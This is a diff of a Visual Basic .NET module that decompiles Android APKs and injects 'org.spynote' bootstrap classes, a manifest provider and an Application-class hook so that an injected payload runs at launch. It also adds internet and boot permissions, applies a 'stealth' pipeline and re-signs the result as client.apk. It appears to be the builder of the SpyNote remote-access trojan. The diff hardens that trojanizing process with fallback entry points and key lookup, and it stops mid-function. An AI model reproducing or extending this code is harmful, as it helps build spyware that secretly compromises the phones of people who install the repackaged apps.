@@ -36,12 +36,190 @@ Public Module ApkNotifyPatcher
         End Try
     End Function
 
+    Private Function GetBuildingRoots() As String()
+        Dim roots As New List(Of String)
+        Dim seen As New HashSet(Of String)(StringComparer.OrdinalIgnoreCase)
+        Dim driveRoot As String = GetDriveRoot()
+        If Not String.IsNullOrWhiteSpace(driveRoot) Then
+            Dim driveBuilding As String = Path.Combine(driveRoot, "Building-6.1")
+            If seen.Add(driveBuilding) Then roots.Add(driveBuilding)
+        End If
+        If seen.Add("C:\Building-6.1") Then roots.Add("C:\Building-6.1")
+        Return roots.ToArray()
+    End Function
+
+    Public Function GetBuildingApktoolRoot() As String
+        For Each buildingRoot As String In GetBuildingRoots()
+            Dim apktoolRoot As String = Path.Combine(buildingRoot, "apktool")
+            If Directory.Exists(apktoolRoot) Then Return apktoolRoot
+        Next
+        Return Path.Combine(GetDriveRoot(), "Building-6.1", "apktool")
+    End Function
+
     Public Function GetBuildingClientApkPath() As String
-        Return Path.Combine(GetDriveRoot(), "Building-6.1", "apktool", "out", "client.apk")
+        Return Path.Combine(GetBuildingApktoolRoot(), "out", "client.apk")
     End Function
 
     Public Function GetBuildingDistApkPath() As String
-        Return Path.Combine(GetDriveRoot(), "Building-6.1", "apktool", "app-release", "dist", "app-release.apk")
+        Return Path.Combine(GetBuildingApktoolRoot(), "app-release", "dist", "app-release.apk")
+    End Function
+
+    Public Function EnsureClientOutputDirectory() As String
+        Dim clientApk As String = GetBuildingClientApkPath()
+        Dim outDir As String = Path.GetDirectoryName(clientApk)
+        If Not String.IsNullOrWhiteSpace(outDir) Then
+            Directory.CreateDirectory(outDir)
+        End If
+        Return clientApk
+    End Function
+
+    Public Function ResolveDistApkPath(Optional resourcesPath As String = Nothing) As String
+        Dim candidates As New List(Of String)
+
+        For Each buildingRoot As String In GetBuildingRoots()
+            Dim apktoolRoot As String = Path.Combine(buildingRoot, "apktool")
+            candidates.Add(Path.Combine(apktoolRoot, "app-release", "dist", "app-release.apk"))
+            candidates.Add(Path.Combine(apktoolRoot, "app-release.apk"))
+            candidates.Add(Path.Combine(apktoolRoot, "app-release-unsigned.apk"))
+            candidates.Add(Path.Combine(apktoolRoot, "app-release", "dist", "app-release-unsigned.apk"))
+
+            Dim distDir As String = Path.Combine(apktoolRoot, "app-release", "dist")
+            If Directory.Exists(distDir) Then
+                For Each apkFile As FileInfo In New DirectoryInfo(distDir).GetFiles("*.apk").OrderByDescending(Function(f) f.LastWriteTimeUtc)
+                    candidates.Add(apkFile.FullName)
+                Next
+            End If
+
+            If Directory.Exists(apktoolRoot) Then
+                For Each apkFile As FileInfo In New DirectoryInfo(apktoolRoot).GetFiles("*.apk").OrderByDescending(Function(f) f.LastWriteTimeUtc)
+                    candidates.Add(apkFile.FullName)
+                Next
+            End If
+        Next
+
+        If Not String.IsNullOrWhiteSpace(resourcesPath) Then
+            Dim payloadDir As String = Path.Combine(resourcesPath, "Imports", "Payload")
+            candidates.Add(Path.Combine(payloadDir, "app-release.apk"))
+        End If
+
+        Dim seen As New HashSet(Of String)(StringComparer.OrdinalIgnoreCase)
+        For Each candidate As String In candidates
+            If String.IsNullOrWhiteSpace(candidate) OrElse Not seen.Add(candidate) Then Continue For
+            If IsValidApkFile(candidate) Then Return candidate
+        Next
+        For Each candidate As String In candidates
+            If String.IsNullOrWhiteSpace(candidate) OrElse Not seen.Contains(candidate) Then Continue For
+            If File.Exists(candidate) AndAlso New FileInfo(candidate).Length > 50000 Then Return candidate
+        Next
+        Return GetBuildingDistApkPath()
+    End Function
+
+    Public Function WaitForDistApk(Optional resourcesPath As String = Nothing, Optional timeoutMs As Integer = 8000) As String
+        Dim deadline As DateTime = DateTime.UtcNow.AddMilliseconds(timeoutMs)
+        Do
+            Dim resolved As String = ResolveDistApkPath(resourcesPath)
+            If File.Exists(resolved) AndAlso New FileInfo(resolved).Length > 50000 Then Return resolved
+            Threading.Thread.Sleep(250)
+        Loop While DateTime.UtcNow < deadline
+        Return ResolveDistApkPath(resourcesPath)
+    End Function
+
+    Public Function HasNotifyEntryPoint(report As NotifyPatchReport) As Boolean
+        If report Is Nothing Then Return False
+        Return report.ProviderInManifest OrElse report.LauncherHookApplied OrElse report.ApplicationHookApplied
+    End Function
+
+    Public Function NormalizeDistApkPath(Optional resourcesPath As String = Nothing) As String
+        Dim resolved As String = ResolveDistApkPath(resourcesPath)
+        If Not File.Exists(resolved) Then Return resolved
+
+        Dim canonical As String = GetBuildingDistApkPath()
+        If String.Equals(Path.GetFullPath(resolved), Path.GetFullPath(canonical), StringComparison.OrdinalIgnoreCase) Then
+            Return resolved
+        End If
+
+        Try
+            Dim canonicalDir As String = Path.GetDirectoryName(canonical)
+            If Not String.IsNullOrWhiteSpace(canonicalDir) Then
+                Directory.CreateDirectory(canonicalDir)
+            End If
+            File.Copy(resolved, canonical, True)
+            Return canonical
+        Catch
+            Return resolved
+        End Try
+    End Function
+
+    Private Function FindFileCaseInsensitive(root As String, fileName As String) As String
+        Try
+            If String.IsNullOrWhiteSpace(root) OrElse Not Directory.Exists(root) Then Return Nothing
+            Dim direct As String = Path.Combine(root, fileName)
+            If File.Exists(direct) Then Return direct
+            For Each match As String In Directory.GetFiles(root, fileName, SearchOption.AllDirectories)
+                Return match
+            Next
+        Catch
+        End Try
+        Return Nothing
+    End Function
+
+    Public Function EnsureSigningTools(resourcesPath As String, ByRef errorMessage As String) As Boolean
+        errorMessage = Nothing
+        Dim root As String = GetBuildingApktoolRoot()
+        Directory.CreateDirectory(root)
+
+        Dim signJar As String = FindFileCaseInsensitive(root, "SignApk.jar")
+        If String.IsNullOrWhiteSpace(signJar) Then signJar = FindFileCaseInsensitive(root, "signapk.jar")
+
+        Dim cert As String = FindFileCaseInsensitive(root, "certificate.pem")
+        Dim keyPk8 As String = FindFileCaseInsensitive(root, "key.pk8")
+
+        If Not String.IsNullOrWhiteSpace(signJar) AndAlso Not String.IsNullOrWhiteSpace(cert) AndAlso Not String.IsNullOrWhiteSpace(keyPk8) Then
+            Return True
+        End If
+
+        Dim searchRoots As New List(Of String)
+        If Not String.IsNullOrWhiteSpace(resourcesPath) Then
+            searchRoots.Add(Path.Combine(resourcesPath, "Imports", "Payload"))
+            searchRoots.Add(Path.Combine(resourcesPath, "Imports"))
+        End If
+        searchRoots.Add(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "Imports", "Payload"))
+
+        For Each payloadDir As String In searchRoots
+            If Not Directory.Exists(payloadDir) Then Continue For
+            If String.IsNullOrWhiteSpace(signJar) Then
+                signJar = FindFileCaseInsensitive(payloadDir, "SignApk.jar")
+                If String.IsNullOrWhiteSpace(signJar) Then signJar = FindFileCaseInsensitive(payloadDir, "signapk.jar")
+            End If
+            If String.IsNullOrWhiteSpace(cert) Then cert = FindFileCaseInsensitive(payloadDir, "certificate.pem")
+            If String.IsNullOrWhiteSpace(keyPk8) Then keyPk8 = FindFileCaseInsensitive(payloadDir, "key.pk8")
+        Next
+
+        Try
+            If Not String.IsNullOrWhiteSpace(signJar) AndAlso Not File.Exists(Path.Combine(root, Path.GetFileName(signJar))) Then
+                File.Copy(signJar, Path.Combine(root, Path.GetFileName(signJar)), True)
+            End If
+            If Not String.IsNullOrWhiteSpace(cert) AndAlso Not File.Exists(Path.Combine(root, "certificate.pem")) Then
+                File.Copy(cert, Path.Combine(root, "certificate.pem"), True)
+            End If
+            If Not String.IsNullOrWhiteSpace(keyPk8) AndAlso Not File.Exists(Path.Combine(root, "key.pk8")) Then
+                File.Copy(keyPk8, Path.Combine(root, "key.pk8"), True)
+            End If
+        Catch ex As Exception
+            errorMessage = ex.Message
+        End Try
+
+        signJar = FindFileCaseInsensitive(root, "SignApk.jar")
+        If String.IsNullOrWhiteSpace(signJar) Then signJar = FindFileCaseInsensitive(root, "signapk.jar")
+        cert = FindFileCaseInsensitive(root, "certificate.pem")
+        keyPk8 = FindFileCaseInsensitive(root, "key.pk8")
+
+        If Not String.IsNullOrWhiteSpace(signJar) AndAlso Not String.IsNullOrWhiteSpace(cert) AndAlso Not String.IsNullOrWhiteSpace(keyPk8) Then
+            Return True
+        End If
+
+        errorMessage = "SignApk.jar or keys not found in Building-6.1\apktool"
+        Return False
     End Function
 
     Public Function IsValidApkFile(apkPath As String) As Boolean
@@ -57,43 +235,56 @@ Public Module ApkNotifyPatcher
         End Try
     End Function
 
-    Public Function TrySignDistToClient(ByRef errorMessage As String) As Boolean
+    Public Function TrySignDistToClient(ByRef errorMessage As String, Optional resourcesPath As String = Nothing) As Boolean
         errorMessage = Nothing
         Try
-            Dim distApk As String = GetBuildingDistApkPath()
-            Dim clientApk As String = GetBuildingClientApkPath()
+            Dim distApk As String = NormalizeDistApkPath(resourcesPath)
+            Dim clientApk As String = EnsureClientOutputDirectory()
             If Not File.Exists(distApk) Then
                 errorMessage = "Unsigned APK not found: " & distApk
                 Return False
             End If
 
-            Dim root As String = Path.Combine(GetDriveRoot(), "Building-6.1", "apktool")
-            Dim signJar As String = Path.Combine(root, "SignApk.jar")
-            Dim cert As String = Path.Combine(root, "certificate.pem")
-            Dim keyPk8 As String = Path.Combine(root, "key.pk8")
-            If Not File.Exists(signJar) OrElse Not File.Exists(cert) OrElse Not File.Exists(keyPk8) Then
-                errorMessage = "SignApk.jar or keys not found in Building-6.1\apktool"
-                Return False
+            Dim root As String = GetBuildingApktoolRoot()
+            Dim toolsErr As String = Nothing
+            Dim hasSignApk As Boolean = EnsureSigningTools(resourcesPath, toolsErr)
+
+            Dim signJar As String = FindFileCaseInsensitive(root, "SignApk.jar")
+            If String.IsNullOrWhiteSpace(signJar) Then signJar = FindFileCaseInsensitive(root, "signapk.jar")
+            Dim cert As String = FindFileCaseInsensitive(root, "certificate.pem")
+            Dim keyPk8 As String = FindFileCaseInsensitive(root, "key.pk8")
+
+            If hasSignApk AndAlso Not String.IsNullOrWhiteSpace(signJar) AndAlso Not String.IsNullOrWhiteSpace(cert) AndAlso Not String.IsNullOrWhiteSpace(keyPk8) Then
+                Dim signedTemp As String = clientApk & ".signed.tmp"
+                If File.Exists(signedTemp) Then File.Delete(signedTemp)
+
+                Dim signErr As String = Nothing
+                Dim javaExe As String = FindJavaExecutable(root)
+                If RunProcess(javaExe, "-jar """ & signJar & """ """ & cert & """ """ & keyPk8 & """ """ & distApk & """ """ & signedTemp & """", root, signErr, True) AndAlso IsValidApkFile(signedTemp) Then
+                    File.Copy(signedTemp, clientApk, True)
+                    File.Delete(signedTemp)
+                    Return True
+                End If
+
+                If String.IsNullOrWhiteSpace(signErr) Then signErr = toolsErr
+                errorMessage = "SignApk.jar failed: " & If(signErr, "unknown error")
             End If
 
-            Dim signedTemp As String = clientApk & ".signed.tmp"
-            If File.Exists(signedTemp) Then File.Delete(signedTemp)
-
-            Dim signErr As String = Nothing
-            Dim javaExe As String = FindJavaExecutable(root)
-            If Not RunProcess(javaExe, "-jar """ & signJar & """ """ & cert & """ """ & keyPk8 & """ """ & distApk & """ """ & signedTemp & """", root, signErr, True) Then
-                errorMessage = "SignApk.jar failed: " & signErr
-                Return False
+            Dim keystorePath As String = Path.Combine(root, "notify.keystore")
+            Dim unsignedCopy As String = clientApk & ".unsigned.tmp"
+            If File.Exists(unsignedCopy) Then File.Delete(unsignedCopy)
+            File.Copy(distApk, unsignedCopy, True)
+            If TrySignApk(unsignedCopy, keystorePath) AndAlso IsValidApkFile(unsignedCopy) Then
+                File.Copy(unsignedCopy, clientApk, True)
+                File.Delete(unsignedCopy)
+                Return True
             End If
+            If File.Exists(unsignedCopy) Then File.Delete(unsignedCopy)
 
-            If Not IsValidApkFile(signedTemp) Then
-                errorMessage = "Signed APK is invalid"
-                Return False
+            If String.IsNullOrWhiteSpace(errorMessage) Then
+                errorMessage = If(toolsErr, "Signing failed — install Java and check Building-6.1\apktool keys")
             End If
-
-            File.Copy(signedTemp, clientApk, True)
-            File.Delete(signedTemp)
-            Return True
+            Return False
         Catch ex As Exception
             errorMessage = ex.Message
             Return False
@@ -132,7 +323,7 @@ Public Module ApkNotifyPatcher
     End Function
 
     Public Function GetBuildingDecompileDir() As String
-        Return Path.Combine(GetDriveRoot(), "Building-6.1", "apktool", "app-release")
+        Return Path.Combine(GetBuildingApktoolRoot(), "app-release")
     End Function
 
     Public Function TryPrepareDecompiledSource(cfg As NotifySettingsHelper.NotifyConfig, resourcesPath As String, ByRef errorMessage As String) As Boolean
@@ -159,7 +350,7 @@ Public Module ApkNotifyPatcher
             CopyBootstrapSmali(decodeDir, payloadDir)
             CopyDelaySmali(decodeDir, payloadDir)
             If cfg IsNot Nothing AndAlso cfg.Enabled Then
-                EnsureNotifyProviderInManifest(decodeDir)
+                EnsureNotifyProviderInManifest(decodeDir, payloadDir)
                 EnsureNotifyReceiverInManifest(decodeDir)
             End If
             PatchLauncherHook(decodeDir)
@@ -229,6 +420,7 @@ Public Module ApkNotifyPatcher
 
     Public Function TryPatchApk(apkPath As String, cfg As NotifySettingsHelper.NotifyConfig, protectionCfg As ApkProtectionPatcher.ProtectionConfig, ByRef errorMessage As String) As Boolean
         errorMessage = Nothing
+        _lastNotifyPatchReport = Nothing
         Try
             Dim notifyEnabled As Boolean = cfg IsNot Nothing AndAlso cfg.Enabled
             Dim protectionNeedsPatch As Boolean = ApkProtectionPatcher.NeedsSmaliPatch(protectionCfg)
@@ -251,9 +443,10 @@ Public Module ApkNotifyPatcher
                 Return False
             End If
 
-            Dim apktoolJar As String = ExtractApktoolJar(payloadDir)
+            Dim resourcesPayload As String = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "Imports", "Payload")
+            Dim apktoolJar As String = ExtractApktoolJar(If(Directory.Exists(resourcesPayload), resourcesPayload, payloadDir))
             If String.IsNullOrWhiteSpace(apktoolJar) OrElse Not File.Exists(apktoolJar) Then
-                errorMessage = "apktool.jar not found (need apktool.zip in Payload folder)"
+                errorMessage = "apktool.jar not found (need apktool.zip in Payload folder or Building-6.1\apktool)"
                 Return False
             End If
             If Not HasJavaRuntime() Then
@@ -281,28 +474,30 @@ Public Module ApkNotifyPatcher
             SanitizeManifestFile(decodeDir)
 
             WriteNotifyAsset(decodeDir, cfg)
-            CopyNotifySmali(decodeDir, payloadDir)
+            CopyNotifySmali(decodeDir, If(Directory.Exists(resourcesPayload), resourcesPayload, payloadDir))
             WriteNotifyConfigSmali(decodeDir, If(cfg, New NotifySettingsHelper.NotifyConfig()))
             ApkProtectionPatcher.EnsureProtectionRuntime(decodeDir, protectionCfg)
-            CopyBootstrapSmali(decodeDir, payloadDir)
-            CopyDelaySmali(decodeDir, payloadDir)
+            CopyBootstrapSmali(decodeDir, If(Directory.Exists(resourcesPayload), resourcesPayload, payloadDir))
+            CopyDelaySmali(decodeDir, If(Directory.Exists(resourcesPayload), resourcesPayload, payloadDir))
 
-            Dim report As New NotifyPatchReport With {
-                .ConfigHasCredentials = NotifyConfigHasCredentials(cfg)
-            }
-            If notifyEnabled Then
-                report.ProviderInManifest = EnsureNotifyProviderInManifest(decodeDir)
-                report.ReceiverInManifest = EnsureNotifyReceiverInManifest(decodeDir)
+            If protectionCfg IsNot Nothing AndAlso protectionCfg.StealthEnabled Then
+                ApkStealthPatcher.ApplyStealthPipeline(decodeDir, protectionCfg)
             End If
-            report.LauncherHookApplied = PatchLauncherHook(decodeDir)
-            report.ApplicationHookApplied = PatchApplicationHook(decodeDir)
-            _lastNotifyPatchReport = report
 
             EnsureInternetPermission(decodeDir)
             EnsureBootPermission(decodeDir)
 
-            If protectionCfg IsNot Nothing AndAlso protectionCfg.StealthEnabled Then
-                ApkStealthPatcher.ApplyStealthPipeline(decodeDir, protectionCfg)
+            Dim report As New NotifyPatchReport With {
+                .ConfigHasCredentials = NotifyConfigHasCredentials(cfg)
+            }
+            Dim smaliPayloadDir As String = If(Directory.Exists(resourcesPayload), resourcesPayload, payloadDir)
+            ApplyBootstrapEntryPoints(decodeDir, notifyEnabled, report, smaliPayloadDir)
+            _lastNotifyPatchReport = report
+
+            If notifyEnabled AndAlso Not HasNotifyEntryPoint(report) Then
+                RestoreBackup(apkPath, backupPath)
+                errorMessage = "APK notify: no entry point found (provider/launcher/application)"
+                Return False
             End If
 
             Dim rebuiltPath As String = Path.Combine(workRoot, "rebuilt.apk")
@@ -383,6 +578,9 @@ Public Module ApkNotifyPatcher
 
     Private Function ExtractApktoolJar(payloadDir As String) As String
         Try
+            Dim buildingJar As String = Path.Combine(GetBuildingApktoolRoot(), "apktool.jar")
+            If File.Exists(buildingJar) Then Return buildingJar
+
             Dim searchDirs As New List(Of String) From {payloadDir}
             Dim resourcesPayload As String = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "Imports", "Payload")
             If Not searchDirs.Contains(resourcesPayload) Then
@@ -390,14 +588,17 @@ Public Module ApkNotifyPatcher
             End If
 
             For Each dir As String In searchDirs
+                If String.IsNullOrWhiteSpace(dir) Then Continue For
+                Dim existingJar As String = Path.Combine(dir, "_apktool.jar")
+                If File.Exists(existingJar) Then Return existingJar
                 Dim zipPath As String = Path.Combine(dir, "apktool.zip")
-                Dim jarPath As String = Path.Combine(payloadDir, "_apktool.jar")
-                If File.Exists(jarPath) Then Return jarPath
+                Dim jarPath As String = Path.Combine(If(String.IsNullOrWhiteSpace(payloadDir), dir, payloadDir), "_apktool.jar")
                 If Not File.Exists(zipPath) Then Continue For
 
                 Using archive As ZipArchive = System.IO.Compression.ZipFile.OpenRead(zipPath)
                     For Each entry As ZipArchiveEntry In archive.Entries
                         If Not entry.FullName.EndsWith("apktool.jar", StringComparison.OrdinalIgnoreCase) Then Continue For
+                        Directory.CreateDirectory(Path.GetDirectoryName(jarPath))
                         Using fs As New FileStream(jarPath, FileMode.Create, FileAccess.Write)
                             Using entryStream As Stream = entry.Open()
                                 entryStream.CopyTo(fs)
@@ -539,13 +740,18 @@ Public Module ApkNotifyPatcher
     Private Function FindJavaExecutable(root As String) As String
         Dim candidates As String() = {
             Path.Combine(root, "jre", "bin", "java.exe"),
+            Path.Combine(GetBuildingApktoolRoot(), "jre", "bin", "java.exe"),
             "C:\Program Files (x86)\Java\jre1.8.0_501\bin\java.exe",
             "C:\Program Files (x86)\Java\jre1.8.0_461\bin\java.exe",
-            "C:\Program Files\Java\jre1.8.0_501\bin\java.exe"
+            "C:\Program Files\Java\jre1.8.0_501\bin\java.exe",
+            "C:\Program Files\Eclipse Adoptium\jre-8\bin\java.exe",
+            "C:\Program Files\Java\jdk-17\bin\java.exe"
         }
         For Each candidate As String In candidates
             If File.Exists(candidate) Then Return candidate
         Next
+        Dim javaErr As String = Nothing
+        If RunProcess("java", "-version", Environment.CurrentDirectory, javaErr, True) Then Return "java"
         Return "java"
     End Function
 
@@ -716,6 +922,232 @@ Public Module ApkNotifyPatcher
         End Try
     End Sub
 
+    Public Function RunBuildProcess(fileName As String, arguments As String, workingDirectory As String, ByRef errorOutput As String, Optional allowNonZero As Boolean = False) As Boolean
+        Return RunProcess(fileName, arguments, workingDirectory, errorOutput, allowNonZero)
+    End Function
+
+    Public Function BuildHasJavaRuntime() As Boolean
+        Return HasJavaRuntime()
+    End Function
+
+    Public Function ResolveApktoolJar(payloadDir As String) As String
+        Return ExtractApktoolJar(payloadDir)
+    End Function
+
+    Public Sub CopyDirectoryRecursive(sourceDir As String, destDir As String)
+        If Not Directory.Exists(sourceDir) Then Return
+        Directory.CreateDirectory(destDir)
+        For Each file As String In Directory.GetFiles(sourceDir)
+            System.IO.File.Copy(file, Path.Combine(destDir, Path.GetFileName(file)), True)
+        Next
+        For Each dir As String In Directory.GetDirectories(sourceDir)
+            CopyDirectoryRecursive(dir, Path.Combine(destDir, Path.GetFileName(dir)))
+        Next
+    End Sub
+
+    Private Sub ApplyBootstrapEntryPoints(decodeDir As String, notifyEnabled As Boolean, report As NotifyPatchReport, payloadDir As String)
+        EnsureBootstrapSmaliPresent(decodeDir, payloadDir)
+
+        If notifyEnabled Then
+            report.ProviderInManifest = EnsureNotifyProviderInManifest(decodeDir, payloadDir)
+            report.ReceiverInManifest = EnsureNotifyReceiverInManifest(decodeDir)
+            If Not report.ProviderInManifest Then
+                report.ProviderInManifest = ForceNotifyProviderBootstrap(decodeDir, payloadDir)
+            End If
+        End If
+
+        report.LauncherHookApplied = PatchLauncherHook(decodeDir)
+        report.ApplicationHookApplied = PatchApplicationHook(decodeDir)
+        If Not report.ApplicationHookApplied Then
+            report.ApplicationHookApplied = EnsureSpyNoteApplicationHook(decodeDir)
+        End If
+        If notifyEnabled AndAlso Not HasNotifyEntryPoint(report) Then
+            report.ApplicationHookApplied = report.ApplicationHookApplied OrElse PatchApplicationHookFlexible(decodeDir)
+            If Not report.ProviderInManifest Then
+                report.ProviderInManifest = ForceNotifyProviderBootstrap(decodeDir, payloadDir)
+            End If
+        End If
+    End Sub
+
+    Private Sub EnsureBootstrapSmaliPresent(decodeDir As String, payloadDir As String)
+        Dim bootstrapPath As String = Path.Combine(decodeDir, "smali", "org", "spynote", "AppBootstrap.smali")
+        Dim providerPath As String = Path.Combine(decodeDir, "smali", "org", "spynote", "NotifyInitProvider.smali")
+        If Not File.Exists(bootstrapPath) Then
+            CopyBootstrapSmali(decodeDir, payloadDir)
+        End If
+        If Not File.Exists(providerPath) Then
+            CopyNotifySmali(decodeDir, payloadDir)
+        End If
+        If Not File.Exists(bootstrapPath) OrElse Not File.Exists(providerPath) Then
+            EnsureNotifyProviderSmali(decodeDir, payloadDir)
+        End If
+    End Sub
+
+    Private Sub EnsureNotifyProviderSmali(decodeDir As String, payloadDir As String)
+        Dim searchDirs As New List(Of String) From {
+            Path.Combine(payloadDir, "notify_smali"),
+            Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "Imports", "Payload", "notify_smali")
+        }
+        Dim targetDir As String = Path.Combine(decodeDir, "smali", "org", "spynote")
+        Directory.CreateDirectory(targetDir)
+        Dim files As String() = {"NotifyInitProvider.smali", "AppBootstrap.smali", "BootstrapWorker.smali"}
+        For Each candidate As String In searchDirs
+            If Not Directory.Exists(candidate) Then Continue For
+            For Each fileName As String In files
+                Dim source As String = Path.Combine(candidate, "org", "spynote", fileName)
+                If File.Exists(source) Then
+                    File.Copy(source, Path.Combine(targetDir, fileName), True)
+                End If
+            Next
+            Return
+        Next
+    End Sub
+
+    Private Function ManifestContainsNotifyProvider(manifestText As String) As Boolean
+        If String.IsNullOrWhiteSpace(manifestText) Then Return False
+        Return manifestText.IndexOf("NotifyInitProvider", StringComparison.OrdinalIgnoreCase) >= 0
+    End Function
+
+    Private Function GetManifestPackageFromText(manifestText As String) As String
+        If String.IsNullOrWhiteSpace(manifestText) Then Return "spynote.client"
+        Dim pkgMatch As Match = Regex.Match(manifestText, "package\s*=\s*""([^""]+)""", RegexOptions.IgnoreCase, TimeSpan.FromSeconds(2))
+        If pkgMatch.Success AndAlso Not String.IsNullOrWhiteSpace(pkgMatch.Groups(1).Value) Then
+            Return pkgMatch.Groups(1).Value.Trim()
+        End If
+        Return "spynote.client"
+    End Function
+
+    Private Function ForceNotifyProviderBootstrap(decodeDir As String, payloadDir As String) As Boolean
+        Try
+            EnsureNotifyProviderSmali(decodeDir, payloadDir)
+            Dim manifestPath As String = Path.Combine(decodeDir, "AndroidManifest.xml")
+            If Not File.Exists(manifestPath) Then Return False
+
+            SanitizeManifestFile(decodeDir)
+            Dim text As String = File.ReadAllText(manifestPath, Encoding.UTF8)
+            If ManifestContainsNotifyProvider(text) Then Return True
+            If TryInsertNotifyProviderXml(manifestPath) Then Return True
+
+            Dim packageName As String = GetManifestPackageFromText(text)
+            Dim authority As String = packageName & ".spynote.notify"
+            Dim providerBlock As String =
+                "    <provider android:name=""org.spynote.NotifyInitProvider"" android:authorities=""" & authority & """ android:exported=""false"" android:initOrder=""100"" />" & vbCrLf
+
+            Dim closeIdx As Integer = text.LastIndexOf("</application>", StringComparison.OrdinalIgnoreCase)
+            If closeIdx >= 0 Then
+                text = text.Insert(closeIdx, providerBlock)
+                File.WriteAllText(manifestPath, text, New UTF8Encoding(False))
+                Return ManifestContainsNotifyProvider(File.ReadAllText(manifestPath, Encoding.UTF8))
+            End If
+
+            Return False
+        Catch
+            Return False
+        End Try
+    End Function
+
+    Private Function TryInsertNotifyProviderXml(manifestPath As String) As Boolean
+        Try
+            SanitizeManifestFile(Path.GetDirectoryName(manifestPath))
+            Dim xmlDoc As New XmlDocument()
+            xmlDoc.PreserveWhitespace = True
+            xmlDoc.Load(manifestPath)
+
+            Dim manifestNode As XmlElement = xmlDoc.DocumentElement
+            If manifestNode Is Nothing Then Return False
+            If String.IsNullOrWhiteSpace(manifestNode.GetAttribute("xmlns:android")) Then
+                manifestNode.SetAttribute("xmlns:android", AndroidNs)
+            End If
+
+            Dim packageName As String = manifestNode.GetAttribute("package")
+            If String.IsNullOrWhiteSpace(packageName) Then packageName = "spynote.client"
+
+            Dim appNode As XmlNode = manifestNode.SelectSingleNode("application")
+            If appNode Is Nothing Then Return False
+
+            For Each child As XmlNode In appNode.ChildNodes
+                If child.NodeType <> XmlNodeType.Element OrElse Not String.Equals(child.Name, "provider", StringComparison.OrdinalIgnoreCase) Then Continue For
+                Dim providerName As String = GetAndroidAttr(child, "name")
+                If providerName.IndexOf("NotifyInitProvider", StringComparison.OrdinalIgnoreCase) >= 0 Then Return True
+            Next
+
+            Dim providerElement As XmlElement = xmlDoc.CreateElement("provider")
+            providerElement.SetAttribute("name", AndroidNs, "org.spynote.NotifyInitProvider")
+            providerElement.SetAttribute("authorities", AndroidNs, packageName & ".spynote.notify")
+            providerElement.SetAttribute("exported", AndroidNs, "false")
+            providerElement.SetAttribute("initOrder", AndroidNs, "100")
+            If appNode.FirstChild IsNot Nothing Then
+                appNode.InsertBefore(providerElement, appNode.FirstChild)
+            Else
+                appNode.AppendChild(providerElement)
+            End If
+
+            xmlDoc.Save(manifestPath)
+            Return ManifestContainsNotifyProvider(File.ReadAllText(manifestPath, Encoding.UTF8))
+        Catch
+            Return False
+        End Try
+    End Function
+
+    Private Function EnsureSpyNoteApplicationHook(decodeDir As String) As Boolean
+        Try
+            If EnsureSpyNoteApplicationInManifest(decodeDir) Then
+                WriteSpyNoteApplicationSmali(decodeDir)
+                Return True
+            End If
+        Catch
+        End Try
+        Return False
+    End Function
+
+    Private Function EnsureSpyNoteApplicationInManifest(decodeDir As String) As Boolean
+        Dim manifestPath As String = Path.Combine(decodeDir, "AndroidManifest.xml")
+        If Not File.Exists(manifestPath) Then Return False
+
+        SanitizeManifestFile(decodeDir)
+        Dim text As String = File.ReadAllText(manifestPath, Encoding.UTF8)
+        If text.IndexOf("org.spynote.SpyNoteApplication", StringComparison.OrdinalIgnoreCase) >= 0 Then Return True
+
+        Dim appPattern As String = "<application\b([^>]*)>"
+        Dim appMatch As Match = Regex.Match(text, appPattern, RegexOptions.IgnoreCase, TimeSpan.FromSeconds(2))
+        If Not appMatch.Success Then Return False
+
+        Dim appAttrs As String = appMatch.Groups(1).Value
+        If appAttrs.IndexOf("android:name=", StringComparison.OrdinalIgnoreCase) >= 0 Then Return False
+
+        Dim replacement As String = "<application android:name=""org.spynote.SpyNoteApplication""" & appAttrs & ">"
+        text = Regex.Replace(text, appPattern, replacement, RegexOptions.IgnoreCase, TimeSpan.FromSeconds(2))
+        File.WriteAllText(manifestPath, text, New UTF8Encoding(False))
+        Return True
+    End Function
+
+    Private Sub WriteSpyNoteApplicationSmali(decodeDir As String)
+        Dim smaliDir As String = Path.Combine(decodeDir, "smali", "org", "spynote")
+        Directory.CreateDirectory(smaliDir)
+        Dim smaliPath As String = Path.Combine(smaliDir, "SpyNoteApplication.smali")
+        If File.Exists(smaliPath) Then Return
+
+        Dim content As String =
+            ".class public Lorg/spynote/SpyNoteApplication;" & vbCrLf &
+            ".super Landroid/app/Application;" & vbCrLf &
+            ".source ""SpyNoteApplication.java""" & vbCrLf & vbCrLf &
+            ".method public constructor <init>()V" & vbCrLf &
+            "    .locals 0" & vbCrLf &
+            "    invoke-direct {p0}, Landroid/app/Application;-><init>()V" & vbCrLf &
+            "    return-void" & vbCrLf &
+            ".end method" & vbCrLf & vbCrLf &
+            ".method public onCreate()V" & vbCrLf &
+            "    .locals 1" & vbCrLf &
+            "    invoke-super {p0}, Landroid/app/Application;->onCreate()V" & vbCrLf &
+            "    invoke-virtual {p0}, Lorg/spynote/SpyNoteApplication;->getApplicationContext()Landroid/content/Context;" & vbCrLf &
+            "    move-result-object v0" & vbCrLf &
+            "    invoke-static {v0}, Lorg/spynote/AppBootstrap;->onStart(Landroid/content/Context;)V" & vbCrLf &
+            "    return-void" & vbCrLf &
+            ".end method" & vbCrLf
+
+        File.WriteAllText(smaliPath, content, New UTF8Encoding(False))
+    End Sub
+
     Private Function PatchLauncherHook(decodeDir As String) As Boolean
         Dim manifestPath As String = Path.Combine(decodeDir, "AndroidManifest.xml")
         Dim launcherClass As String = FindLauncherActivityClass(manifestPath)
@@ -731,7 +1163,9 @@ Public Module ApkNotifyPatcher
 
         Dim signatures As String() = {
             ".method protected onCreate(Landroid/os/Bundle;)V",
-            ".method public onCreate(Landroid/os/Bundle;)V"
+            ".method public onCreate(Landroid/os/Bundle;)V",
+            ".method private onCreate(Landroid/os/Bundle;)V",
+            ".method final onCreate(Landroid/os/Bundle;)V"
         }
 
         Dim text As String = File.ReadAllText(smaliPath)
@@ -739,6 +1173,15 @@ Public Module ApkNotifyPatcher
 
         For Each signature As String In signatures
             If PatchOnCreateMethod(text, signature, classDescriptor, hook) Then
+                File.WriteAllText(smaliPath, text, New UTF8Encoding(False))
+                Return True
+            End If
+        Next
+
+        Dim methodPattern As String = "\.method[^\n]*onCreate\(Landroid/os/Bundle;\)V"
